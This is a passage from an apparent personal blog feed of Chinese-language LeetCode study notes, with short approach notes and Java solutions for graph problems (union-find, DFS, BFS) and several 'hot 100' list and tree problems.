class="operator">=</span> eMap.get(entry.getKey());</span><br><span class="line">            <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="keyword">if</span>( e == v * (v - <span class="number">1</span>) / <span class="number">2</span>) res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="type">int</span>[] rank;</span><br><span class="line">    UnionFind(<span class="type">int</span> n)&#123;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        rank = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            rank[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x == parent[x] ? x : (parent[x] = find(parent[x]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> find(i);</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> find(j);</span><br><span class="line">        <span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">            parent[x] = y;</span><br><span class="line">        &#125;<span class="keyword">else</span> parent[y] = x;</span><br><span class="line">        <span class="keyword">if</span>(rank[x] == rank[y]) rank[y]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2192-有向无环图中一个节点的所有祖先"><a href="#2192-有向无环图中一个节点的所有祖先" class="headerlink" title="2192. 有向无环图中一个节点的所有祖先"></a><a href="https://leetcode.cn/problems/all-ancestors-of-a-node-in-a-directed-acyclic-graph/">2192. 有向无环图中一个节点的所有祖先</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向dfs，每次都从一个点开始dfs，设置visited数组记录每个点的访问情况</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">getAncestors</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] edges)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt;[] list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>[n];</span><br><span class="line">        Arrays.setAll(list, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="type">boolean</span>[] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] edge : edges) &#123;</span><br><span class="line">            list[edge[<span class="number">1</span>]].add(edge[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">            Arrays.fill(visited, <span class="literal">false</span>);</span><br><span class="line">            dfs(list, visited, i);</span><br><span class="line">            visited[i] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(visited[j])&#123;</span><br><span class="line">                    res.get(i).add(j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(List&lt;Integer&gt;[] list, <span class="type">boolean</span>[] visited, <span class="type">int</span> i)</span>&#123;</span><br><span class="line">        visited[i] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> next : list[i]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[next]) &#123;</span><br><span class="line">                dfs(list, visited, next);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo：之后补拓扑排序做法</p>
<h3 id="924-尽量减少恶意软件的传播"><a href="#924-尽量减少恶意软件的传播" class="headerlink" title="924. 尽量减少恶意软件的传播"></a><a href="https://leetcode.cn/problems/minimize-malware-spread/">924. 尽量减少恶意软件的传播</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直观猜测删除点应该是和感染点直接相连接的点。感觉可以枚举删除连接的点然后记录个数。2&lt;=n&lt;=300感觉复杂度应该可行。但是initial的length不是一定为1， 感觉不太可行。。。。。</span><br><span class="line">直接看题解了</span><br><span class="line"></span><br><span class="line">连通块有两个节点被感染那么移除一个没用的。目标找到某个连通块只有一个感染节点且包含点最多。那会写了，虽然是放在dfs专题里，但感觉还是并查集写简单点</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">badNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minMalwareSpread</span><span class="params">(<span class="type">int</span>[][] graph, <span class="type">int</span>[] initial)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> graph.length;</span><br><span class="line">        <span class="type">UnionFind</span> <span class="variable">unionFind</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnionFind</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(graph[i][j] == <span class="number">1</span>) unionFind.merge(i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;Integer, Integer&gt; numMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Integer, Integer&gt; evilMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            numMap.merge(unionFind.find(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : initial) &#123;</span><br><span class="line">            evilMap.merge(unionFind.find(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> evilNum : initial) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> unionFind.find(evilNum);</span><br><span class="line">            <span class="keyword">if</span>(evilMap.get(parent) != <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(num == -<span class="number">1</span>)&#123;</span><br><span class="line">                    res = Integer.min(res, evilNum);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(num &lt; numMap.get(parent))&#123;</span><br><span class="line">                    num = numMap.get(parent);</span><br><span class="line">                    res = evilNum;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == numMap.get(parent) &amp;&amp; res &gt; evilNum) &#123;</span><br><span class="line">                    res = evilNum;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Solution</span> <span class="variable">solution</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Solution</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="type">int</span>[] rank;</span><br><span class="line">    UnionFind(<span class="type">int</span> n)&#123;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        rank = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            rank[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x == parent[x] ? x : (parent[x] = find(parent[x]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> find(i);</span><br><span class="line">        <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> find(j);</span><br><span class="line">        <span class="keyword">if</span>(rank[x] &lt;= rank[y])&#123;</span><br><span class="line">            parent[x] = y;</span><br><span class="line">        &#125;<span class="keyword">else</span> parent[y] = x;</span><br><span class="line">        <span class="keyword">if</span>(rank[x] == rank[y]) rank[y]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>todo：有空补下dfs写法（感觉dfs写法应该会难很多）</p>
<h2 id="BFS-基础"><a href="#BFS-基础" class="headerlink" title="BFS 基础"></a>BFS 基础</h2><h3 id="3243-新增道路查询后的最短距离-I"><a href="#3243-新增道路查询后的最短距离-I" class="headerlink" title="3243. 新增道路查询后的最短距离 I"></a><a href="https://leetcode.cn/problems/shortest-distance-after-road-addition-queries-i/">3243. 新增道路查询后的最短距离 I</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">暴力bfs</span><br><span class="line">dp:一个点的来源路径有两个前面一个点，加入的query。加入queriys只会影响query[1]及其之后的最短路径</span><br></pre></td></tr></table></figure>

<p>bfs代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] shortestDistanceAfterQueries(<span class="type">int</span> n, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        List&lt;Integer&gt;[] listArr = <span class="keyword">new</span> <span class="title class_">ArrayList</span>[n];</span><br><span class="line">        Arrays.setAll(listArr, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            listArr[i].add(i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] visited = <span class="keyword">new</span> <span class="title class_">int</span>[n - <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[queries.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">            listArr[queries[i][<span class="number">0</span>]].add(queries[i][<span class="number">1</span>]);</span><br><span class="line">            res[i] = bfs(i + <span class="number">1</span>, visited, listArr, n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">bfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span>[] visited, List&lt;Integer&gt;[] listArr, <span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Queue&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        queue.add(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sz</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            res++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; sz; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                visited[cur] = i;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> next : listArr[cur]) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(next == n - <span class="number">1</span>) <span class="keyword">return</span> res;</span><br><span class="line">                    <span class="keyword">if</span>(visited[next] != i)&#123;</span><br><span class="line">                        queue.add(next);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dp代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] shortestDistanceAfterQueries(<span class="type">int</span> n, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        List&lt;Integer&gt;[] record = <span class="keyword">new</span> <span class="title class_">ArrayList</span>[n];</span><br><span class="line">        Arrays.setAll(record, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[queries.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> queries[i][<span class="number">1</span>];</span><br><span class="line">            dp[right] = Integer.min(dp[right], dp[left] + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> right + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[j] = Integer.min(dp[j - <span class="number">1</span>] + <span class="number">1</span>, dp[j]);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> prev : record[j]) &#123;</span><br><span class="line">                    dp[j] = Integer.min(dp[prev] + <span class="number">1</span>, dp[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            record[queries[i][<span class="number">1</span>]].add(queries[i][<span class="number">0</span>]);</span><br><span class="line">            res[i] = dp[n - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1311-获取你好友已观看的视频"><a href="#1311-获取你好友已观看的视频" class="headerlink" title="1311. 获取你好友已观看的视频"></a><a href="https://leetcode.cn/problems/get-watched-videos-by-your-friends/">1311. 获取你好友已观看的视频</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bfs，加自带排序的treeMap</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h2><h2 id="在拓扑序上-DP"><a href="#在拓扑序上-DP" class="headerlink" title="在拓扑序上 DP"></a>在拓扑序上 DP</h2><h2 id="基环树"><a href="#基环树" class="headerlink" title="基环树"></a>基环树</h2><h2 id="单源最短路：Dijkstra"><a href="#单源最短路：Dijkstra" class="headerlink" title="单源最短路：Dijkstra"></a>单源最短路：Dijkstra</h2><h2 id="全源最短路：Floyd"><a href="#全源最短路：Floyd" class="headerlink" title="全源最短路：Floyd"></a>全源最短路：Floyd</h2><h2 id="Bitset-优化-Floyd"><a href="#Bitset-优化-Floyd" class="headerlink" title="Bitset 优化 Floyd"></a>Bitset 优化 Floyd</h2><h2 id="最小生成树：Kruskal-x2F-Prim"><a href="#最小生成树：Kruskal-x2F-Prim" class="headerlink" title="最小生成树：Kruskal&#x2F;Prim"></a>最小生成树：Kruskal&#x2F;Prim</h2><h2 id="欧拉路径-x2F-欧拉回路：Hierholzer"><a href="#欧拉路径-x2F-欧拉回路：Hierholzer" class="headerlink" title="欧拉路径&#x2F;欧拉回路：Hierholzer"></a>欧拉路径&#x2F;欧拉回路：Hierholzer</h2><h2 id="强连通分量-x2F-双连通分量：Tarjan"><a href="#强连通分量-x2F-双连通分量：Tarjan" class="headerlink" title="强连通分量&#x2F;双连通分量：Tarjan"></a>强连通分量&#x2F;双连通分量：Tarjan</h2><h2 id="二分图（染色判定、最大匹配）"><a href="#二分图（染色判定、最大匹配）" class="headerlink" title="二分图（染色判定、最大匹配）"></a>二分图（染色判定、最大匹配）</h2><h2 id="网络流"><a href="#网络流" class="headerlink" title="网络流"></a>网络流</h2><h2 id="模拟费用流"><a href="#模拟费用流" class="headerlink" title="模拟费用流"></a>模拟费用流</h2><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2>]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_hot100_sql</title>
    <url>/2024/12/06/leetcode-hot100/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/problem-list/2cktkvj/">🔥 LeetCode 热题 HOT 100 - 力扣（LeetCode）全球极客挚爱的技术成长平台</a></p>
<p><a href="https://leetcode.cn/studyplan/sql-free-50/">高频 SQL 50 题（基础版） - 学习计划 - 力扣（LeetCode）全球极客挚爱的技术成长平台</a></p>
<p>[toc]</p>
<p>lc经典题目hot100</p>
<span id="more"></span>

<h1 id="hot100"><a href="#hot100" class="headerlink" title="hot100"></a>hot100</h1><h3 id="160-相交链表"><a href="#160-相交链表" class="headerlink" title="160. 相交链表"></a><a href="https://leetcode.cn/problems/intersection-of-two-linked-lists/">160. 相交链表</a></h3><p>思路</p>
<p>(a +  c) + b  &#x3D; (b + c) + a </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Solution &#123;</span><br><span class="line">    public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123;</span><br><span class="line">        ListNode list1 = headA;</span><br><span class="line">        ListNode list2 = headB;</span><br><span class="line">        while(list1 != list2)&#123;</span><br><span class="line">            list1 = list1 == null? headB : list1.next;</span><br><span class="line">            list2 = list2 == null? headA : list2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        return list1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></h3><p>思路</p>
<p>得左右根，即后续遍历。先把框架写好，再看看下一步干嘛</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        dfs(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ans != <span class="literal">null</span> || root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">leftRes</span> <span class="operator">=</span> dfs(root.left, p, q);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">rightRes</span> <span class="operator">=</span> dfs(root.right, p, q);</span><br><span class="line">        <span class="keyword">if</span>((leftRes &amp;&amp; rightRes) || ((leftRes || rightRes) &amp;&amp; (root == p || root == q)))&#123;</span><br><span class="line">            ans = root;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> leftRes || rightRes || (root == p || root == q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234. 回文链表"></a><a href="https://leetcode.cn/problems/palindrome-linked-list/">234. 回文链表</a></h3><p>思路</p>
<p>反转链表 + 双指针。</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            <span class="keyword">if</span>(fast != <span class="literal">null</span>) fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">left</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">right</span> <span class="operator">=</span> reverseListNode(slow, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">recoveryStart</span> <span class="operator">=</span> right;</span><br><span class="line">        <span class="keyword">while</span>(right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(left.val != right.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            right = right.next;</span><br><span class="line">            left = left.next;</span><br><span class="line">        &#125;</span><br><span class="line">        reverseListNode(recoveryStart, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode <span class="title function_">reverseListNode</span><span class="params">(ListNode start, ListNode end)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> start;</span><br><span class="line">        <span class="keyword">while</span>(cur != end)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">curNext</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = curNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="739-每日温度"><a href="#739-每日温度" class="headerlink" title="739. 每日温度"></a><a href="https://leetcode.cn/problems/daily-temperatures/">739. 每日温度</a></h3><p>思路</p>
<p>经典单调栈:每个元素都能入栈，能出栈说明有比他大的元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dailyTemperatures(<span class="type">int</span>[] temperatures) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> temperatures.length;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; temperatures[i] &gt; temperatures[stack.peek()])&#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">preIndex</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                res[preIndex] = i - preIndex;</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h3><p>思路</p>
<p>后序遍历递归即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = temp;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="221-最大正方形"><a href="#221-最大正方形" class="headerlink" title="221. 最大正方形"></a><a href="https://leetcode.cn/problems/maximal-square/">221. 最大正方形</a></h3><p>思路</p>
